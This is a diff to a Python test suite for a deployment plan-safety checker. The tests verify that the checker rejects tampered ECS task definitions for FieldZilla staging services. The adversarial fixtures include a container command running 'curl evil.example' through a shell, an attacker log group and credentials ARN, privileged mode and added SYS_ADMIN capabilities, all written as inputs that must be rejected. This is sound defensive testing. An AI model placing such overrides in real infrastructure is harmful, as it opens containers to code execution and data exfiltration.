@@ -675,41 +675,53 @@ class FieldZillaPlanAuthorizationTests(unittest.TestCase):
 
     def test_new_task_definition_create_with_no_prior_state(self) -> None:
         """A task-definition create with no prior Terraform state (e.g. superseding a
-        manually created revision) is approved only against a fixed, conservative design
+        manually created revision) is approved only against an exact, per-family design
         baseline -- exercises the exact FieldZilla 'api' plan shape and every adversarial
-        rejection of that baseline."""
-        runtime_prefix = auth.RUNTIME_SECRET_ARN_PREFIX
+        rejection of that baseline, including cross-family/repo mismatches, incomplete run
+        authorization, digest evidence handling, and exact secret ARN/key-set binding."""
+        runtime_arn = auth.EXACT_RUNTIME_SECRET_ARN
+        digest = IMAGE_DIGEST
+        wrong_digest = "sha256:" + "7" * 64
 
-        def make_after(**overrides: object) -> dict[str, object]:
-            base_container = {
-                "name": "api",
-                "image": f"918870682888.dkr.ecr.ap-south-1.amazonaws.com/synergie/fieldzilla/staging/api:{DEPLOY_SHA}",
-                "cpu": 256,
-                "memory": 512,
-                "essential": True,
-                "secrets": [{"name": "APP_KEY", "valueFrom": f"{runtime_prefix}APP_KEY::"}],
-            }
-            containers = overrides.pop("container_definitions", [base_container])
+        def approved_secrets(keys: frozenset[str]) -> list[dict[str, str]]:
+            return [{"name": key, "valueFrom": f"{runtime_arn}:{key}::"} for key in sorted(keys)]
+
+        def make_container(family: str, **overrides: object) -> dict[str, object]:
+            family_baseline = auth.FIELDZILLA_TASK_DEFINITION_BASELINE.get(family, auth.FIELDZILLA_TASK_DEFINITION_BASELINE["fieldzilla-staging-api"])
+            baseline_container = dict(family_baseline["container"])
+            repo = family_baseline["ecr_repository"]
+            secret_keys = overrides.pop("secret_keys", baseline_container["secret_keys"])
+            container = {k: v for k, v in baseline_container.items() if k != "secret_keys"}
+            container["image"] = f"918870682888.dkr.ecr.ap-south-1.amazonaws.com/{repo}:{DEPLOY_SHA}"
+            container["imageDigest"] = digest
+            container["secrets"] = approved_secrets(secret_keys)
+            container.update(overrides)
+            return container
+
+        def make_after(family: str = "fieldzilla-staging-api", container_overrides: dict[str, object] | None = None, containers: list[dict[str, object]] | None = None, **overrides: object) -> dict[str, object]:
+            baseline = auth.FIELDZILLA_TASK_DEFINITION_BASELINE.get(family, auth.FIELDZILLA_TASK_DEFINITION_BASELINE["fieldzilla-staging-api"])
+            if containers is None:
+                containers = [make_container(family, **(container_overrides or {}))]
             after = {
-                "family": "fieldzilla-staging-api",
-                "cpu": "256",
-                "memory": "512",
-                "network_mode": "bridge",
-                "requires_compatibilities": ["EC2"],
-                "execution_role_arn": "arn:aws:iam::918870682888:role/SynergieFieldzillaStagingEcsExecution",
-                "task_role_arn": "arn:aws:iam::918870682888:role/SynergieFieldzillaStagingTask",
-                "ipc_mode": "",
-                "pid_mode": "",
-                "runtime_platform": [],
-                "track_latest": False,
-                "volume": [],
+                "family": family,
+                "cpu": baseline["cpu"],
+                "memory": baseline["memory"],
+                "execution_role_arn": baseline["execution_role_arn"],
+                "task_role_arn": baseline["task_role_arn"],
+                "network_mode": baseline["network_mode"],
+                "requires_compatibilities": baseline["requires_compatibilities"],
+                "runtime_platform": baseline["runtime_platform"],
+                "volume": baseline["volume"],
+                "placement_constraints": baseline["placement_constraints"],
+                "proxy_configuration": baseline["proxy_configuration"],
+                "ephemeral_storage": baseline["ephemeral_storage"],
                 "container_definitions": json.dumps(containers, sort_keys=True),
             }
             after.update(overrides)
             return after
 
-        def plan_for(after: dict[str, object]) -> dict[str, object]:
-            return {
+        def plan_for(after: dict[str, object], family_address: str = "api", ecs_families: str | None = None, image_digest: str | None = digest) -> tuple[dict[str, object], Namespace]:
+            plan = {
                 "variables": {
                     "enable_production": {"value": False},
                     "route53_zone_id": {"value": ""},
@@ -719,156 +731,165 @@ class FieldZillaPlanAuthorizationTests(unittest.TestCase):
                 },
                 "resource_changes": [
                     {
-                        "address": 'aws_ecs_task_definition.api["staging"]',
+                        "address": f'aws_ecs_task_definition.{family_address}["staging"]',
                         "type": "aws_ecs_task_definition",
                         "change": {"actions": ["create"], "before": None, "after": after},
                     }
                 ],
             }
+            args = Namespace(
+                plan_kind="normal",
+                expected_sha=DEPLOY_SHA,
+                image_digest=digest if image_digest is None else image_digest,
+                ecs_families=ECS_FAMILIES if ecs_families is None else ecs_families,
+            )
+            return plan, args
 
-        def check(after: dict[str, object]) -> None:
+        def check(after: dict[str, object], **plan_kwargs: object) -> None:
+            plan, args = plan_for(after, **plan_kwargs)
             with tempfile.TemporaryDirectory() as tmp:
                 plan_json = Path(tmp) / "plan.json"
-                plan_json.write_text(json.dumps(plan_for(after)), encoding="utf-8")
-                auth.verify_plan_safety(
-                    Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest="", ecs_families="")
-                )
+                plan_json.write_text(json.dumps(plan), encoding="utf-8")
+                auth.verify_plan_safety(Namespace(plan_json_path=plan_json, **vars(args)))
 
-        def check_rejected(after: dict[str, object]) -> None:
+        def check_rejected(after: dict[str, object], **plan_kwargs: object) -> None:
+            plan, args = plan_for(after, **plan_kwargs)
             with tempfile.TemporaryDirectory() as tmp:
                 plan_json = Path(tmp) / "plan.json"
-                plan_json.write_text(json.dumps(plan_for(after)), encoding="utf-8")
+                plan_json.write_text(json.dumps(plan), encoding="utf-8")
                 with self.assertRaises(SystemExit):
-                    auth.verify_plan_safety(
-                        Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest="", ecs_families="")
-                    )
+                    auth.verify_plan_safety(Namespace(plan_json_path=plan_json, **vars(args)))
 
-        # Approved: exact FieldZilla api plan shape -- no prior state, approved baseline throughout.
-        check(make_after())
+        # --- Approved: exact FieldZilla plan shape, one per family. ---
+        check(make_after("fieldzilla-staging-api"), family_address="api")
+        check(make_after("fieldzilla-staging-admin-web"), family_address="admin-web")
+        check(make_after("fieldzilla-staging-worker"), family_address="worker")
+        check(make_after("fieldzilla-staging-migration"), family_address="migration")
 
-        # Approved: a different approved family, same baseline shape.
-        check(make_after(family="fieldzilla-staging-worker"))
-
-        # Rejected: unapproved family.
+        # --- Rejected: unapproved family / wrong family-to-repository mapping. ---
         check_rejected(make_after(family="fieldzilla-production-api"))
-        check_rejected(make_after(family="not-a-fieldzilla-family"))
+        wrong_repo = make_after("fieldzilla-staging-api")
+        containers = json.loads(wrong_repo["container_definitions"])
+        containers[0]["image"] = f"918870682888.dkr.ecr.ap-south-1.amazonaws.com/synergie/fieldzilla/staging/admin-web:{DEPLOY_SHA}"
+        wrong_repo["container_definitions"] = json.dumps(containers)
+        check_rejected(wrong_repo)
 
-        # Rejected: wrong execution or task role.
+        # --- Rejected: incomplete/empty run authorization for the family set. ---
+        check_rejected(make_after(), ecs_families="")
+        check_rejected(make_after(), ecs_families="fieldzilla-staging-api")
+        check_rejected(make_after(), ecs_families="fieldzilla-staging-api,fieldzilla-staging-worker")
+
+        # --- Rejected: missing or mismatched digest evidence. ---
+        check_rejected(make_after(), image_digest="")
+        no_digest_container = make_after(container_overrides={})
+        containers = json.loads(no_digest_container["container_definitions"])
+        del containers[0]["imageDigest"]
+        no_digest_container["container_definitions"] = json.dumps(containers)
+        check_rejected(no_digest_container)  # absent digest must never satisfy a supplied expected digest
+        mismatched = make_after()
+        containers = json.loads(mismatched["container_definitions"])
+        containers[0]["imageDigest"] = wrong_digest
+        mismatched["container_definitions"] = json.dumps(containers)
+        check_rejected(mismatched)
+
+        # --- Rejected: secret ARN is a prefix-collision, not the exact approved secret. ---
+        prefix_collision = make_after()
+        containers = json.loads(prefix_collision["container_definitions"])
+        containers[0]["secrets"] = [
+            {"name": "APP_SECRET_KEY", "valueFrom": f"{runtime_arn}-evil:APP_SECRET_KEY::"}
+        ]
+        prefix_collision["container_definitions"] = json.dumps(containers)
+        check_rejected(prefix_collision)
+
+        # --- Rejected: arbitrary/extra secret keys, or a missing required key. ---
+        extra_key = make_after()
+        containers = json.loads(extra_key["container_definitions"])
+        containers[0]["secrets"].append({"name": "ARBITRARY_EXTRA_KEY", "valueFrom": f"{runtime_arn}:ARBITRARY_EXTRA_KEY::"})
+        extra_key["container_definitions"] = json.dumps(containers)
+        check_rejected(extra_key)
+        check_rejected(make_after(container_overrides={"secret_keys": frozenset({"APP_SECRET_KEY"})}))
+
+        # --- Rejected: extra container (sidecar). ---
+        sidecar = make_after("fieldzilla-staging-api")
+        containers = json.loads(sidecar["container_definitions"])
+        containers.append(make_container("fieldzilla-staging-api"))
+        sidecar["container_definitions"] = json.dumps(containers)
+        check_rejected(sidecar)
+
+        # --- Rejected: privileged container. ---
+        check_rejected(make_after(container_overrides={"privileged": True}))
+
+        # --- Rejected: altered command/entrypoint. ---
+        check_rejected(make_after(container_overrides={"command": ["/bin/sh", "-c", "curl evil.example"]}))
+        check_rejected(make_after(container_overrides={"entrypoint": ["/bin/sh"]}))
+
+        # --- Rejected: altered environment. ---
+        tampered_env = make_after()
+        containers = json.loads(tampered_env["container_definitions"])
+        containers[0]["environment"] = [{"name": "APP_DEBUG", "value": "true"}]
+        tampered_env["container_definitions"] = json.dumps(containers)
+        check_rejected(tampered_env)
+
+        # --- Rejected: altered logging configuration (e.g. exfiltration target). ---
+        check_rejected(make_after(container_overrides={
+            "logConfiguration": {"logDriver": "awslogs", "options": {"awslogs-group": "/attacker/group", "awslogs-region": "ap-south-1", "awslogs-stream-prefix": "ecs"}}
+        }))
+
+        # --- Rejected: altered port mappings. ---
+        check_rejected(make_after(container_overrides={"portMappings": [{"containerPort": 22, "hostPort": 22, "protocol": "tcp"}]}))
+
+        # --- Rejected: user, linux parameters/capabilities, mount points, repository
+        # credentials, health check, and dependsOn are all constrained -- any deviation
+        # from the approved (unset) baseline fails closed. ---
+        check_rejected(make_after(container_overrides={"user": "root"}))
+        check_rejected(make_after(container_overrides={"linuxParameters": {"capabilities": {"add": ["SYS_ADMIN"]}}}))
+        check_rejected(make_after(container_overrides={"mountPoints": [{"sourceVolume": "host", "containerPath": "/host"}]}))
+        check_rejected(make_after(container_overrides={"repositoryCredentials": {"credentialsParameter": "arn:aws:secretsmanager:ap-south-1:918870682888:secret:attacker"}}))
+        check_rejected(make_after(container_overrides={"healthCheck": {"command": ["CMD-SHELL", "exit 1"]}}))
+        check_rejected(make_after(container_overrides={"dependsOn": [{"containerName": "sidecar", "condition": "START"}]}))
+        check_rejected(make_after(container_overrides={"readonlyRootFilesystem": True}))
+
+        # --- Rejected: under-sized (and over-approved) CPU/memory -- exact match only. ---
+        check_rejected(make_after(cpu="128"))
+        check_rejected(make_after(memory="256"))
+        check_rejected(make_after(cpu="512"))
+        check_rejected(make_after(memory="1024"))
+
+        # --- Rejected: unexpected/unknown container field. ---
+        unknown_field = make_after()
+        containers = json.loads(unknown_field["container_definitions"])
+        containers[0]["extraHosts"] = [{"hostname": "evil", "ipAddress": "10.0.0.1"}]
+        unknown_field["container_definitions"] = json.dumps(containers)
+        check_rejected(unknown_field)
+
+        # --- Rejected: task-level fields outside the approved baseline. ---
         check_rejected(make_after(execution_role_arn="arn:aws:iam::918870682888:role/Other"))
         check_rejected(make_after(task_role_arn="arn:aws:iam::918870682888:role/Other"))
-
-        # Rejected: wrong network mode or capability set.
         check_rejected(make_after(network_mode="awsvpc"))
         check_rejected(make_after(requires_compatibilities=["FARGATE"]))
-
-        # Rejected: host pid/ipc sharing requested.
-        check_rejected(make_after(ipc_mode="host"))
-        check_rejected(make_after(pid_mode="task"))
-
-        # Rejected: a volume is attached.
         check_rejected(make_after(volume=[{"name": "data"}]))
+        check_rejected(make_after(placement_constraints=[{"type": "memberOf", "expression": "attribute:x == y"}]))
+        check_rejected(make_after(proxy_configuration={"type": "APPMESH"}))
+        check_rejected(make_after(ephemeral_storage={"sizeInGiB": 100}))
 
-        # Rejected: track_latest requested.
-        check_rejected(make_after(track_latest=True))
-
-        # Rejected: cpu/memory above the approved ceiling, non-numeric, or non-positive.
-        check_rejected(make_after(cpu="4096"))
-        check_rejected(make_after(memory="8192"))
-        check_rejected(make_after(cpu="not-a-number"))
-        check_rejected(make_after(cpu="0"))
-        check_rejected(make_after(memory="-1"))
-
-        # Rejected: container image is not from the approved FieldZilla staging ECR repo.
-        check_rejected(
-            make_after(
-                container_definitions=[
-                    {
-                        "name": "api",
-                        "image": f"918870682888.dkr.ecr.ap-south-1.amazonaws.com/synergie/other/staging/api:{DEPLOY_SHA}",
-                        "cpu": 256,
-                        "memory": 512,
-                        "essential": True,
-                        "secrets": [],
-                    }
-                ]
-            )
-        )
-
-        # Rejected: image tag does not match the authorized/approved application SHA.
-        check_rejected(
-            make_after(
-                container_definitions=[
-                    {
-                        "name": "api",
-                        "image": "918870682888.dkr.ecr.ap-south-1.amazonaws.com/synergie/fieldzilla/staging/api:1111111111111111111111111111111111111111",
-                        "cpu": 256,
-                        "memory": 512,
-                        "essential": True,
-                        "secrets": [],
-                    }
-                ]
-            )
-        )
-
-        # Rejected: a secret reference points outside the approved staging runtime secret --
-        # there is no pre-existing secret to grandfather in on a bare create.
-        check_rejected(
-            make_after(
-                container_definitions=[
-                    {
-                        "name": "api",
-                        "image": f"918870682888.dkr.ecr.ap-south-1.amazonaws.com/synergie/fieldzilla/staging/api:{DEPLOY_SHA}",
-                        "cpu": 256,
-                        "memory": 512,
-                        "essential": True,
-                        "secrets": [{"name": "EVIL_KEY", "valueFrom": "arn:aws:secretsmanager:ap-south-1:918870682888:secret:/other/secret:KEY::"}],
-                    }
-                ]
-            )
-        )
-
-        # Rejected: a secret reference points at the production environment, not staging.
-        check_rejected(
-            make_after(
-                container_definitions=[
-                    {
-                        "name": "api",
-                        "image": f"918870682888.dkr.ecr.ap-south-1.amazonaws.com/synergie/fieldzilla/staging/api:{DEPLOY_SHA}",
-                        "cpu": 256,
-                        "memory": 512,
-                        "essential": True,
-                        "secrets": [{"name": "APP_PROD_KEY", "valueFrom": "arn:aws:secretsmanager:ap-south-1:918870682888:secret:/synergie/fieldzilla/production/runtime-pXXXXX:APP_PROD_KEY::"}],
-                    }
-                ]
-            )
-        )
-
-        # Rejected: no container definitions at all.
-        check_rejected(make_after(container_definitions=[]))
-
-        # Rejected: malformed plan claims a bare create but still carries a non-null "before"
-        # (should never happen from real OpenTofu output, but must fail closed, not silently
-        # fall through to the replace-path checks which require before to be a dict too).
+        # --- Rejected: malformed plan claims a bare create but still carries a non-null
+        # "before" (should never happen from real OpenTofu output, but must fail closed). ---
         with tempfile.TemporaryDirectory() as tmp:
             plan_json = Path(tmp) / "plan.json"
-            malformed = plan_for(make_after())
-            malformed["resource_changes"][0]["change"]["before"] = {"family": "fieldzilla-staging-api"}
-            plan_json.write_text(json.dumps(malformed), encoding="utf-8")
+            plan, args = plan_for(make_after())
+            plan["resource_changes"][0]["change"]["before"] = {"family": "fieldzilla-staging-api"}
+            plan_json.write_text(json.dumps(plan), encoding="utf-8")
             with self.assertRaises(SystemExit):
-                auth.verify_plan_safety(
-                    Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest="", ecs_families="")
-                )
+                auth.verify_plan_safety(Namespace(plan_json_path=plan_json, **vars(args)))
 
-        # Rejected: "after" missing/not a dict entirely.
+        # --- Rejected: "after" missing/not a dict entirely. ---
         with tempfile.TemporaryDirectory() as tmp:
             plan_json = Path(tmp) / "plan.json"
-            missing_after = plan_for(make_after())
-            missing_after["resource_changes"][0]["change"]["after"] = None
-            plan_json.write_text(json.dumps(missing_after), encoding="utf-8")
+            plan, args = plan_for(make_after())
+            plan["resource_changes"][0]["change"]["after"] = None
+            plan_json.write_text(json.dumps(plan), encoding="utf-8")
             with self.assertRaises(SystemExit):
-                auth.verify_plan_safety(
-                    Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest="", ecs_families="")
-                )
+                auth.verify_plan_safety(Namespace(plan_json_path=plan_json, **vars(args)))
 
     def test_verifies_import_map_and_rejects_wrong_ownership(self) -> None:
         good_doc = {
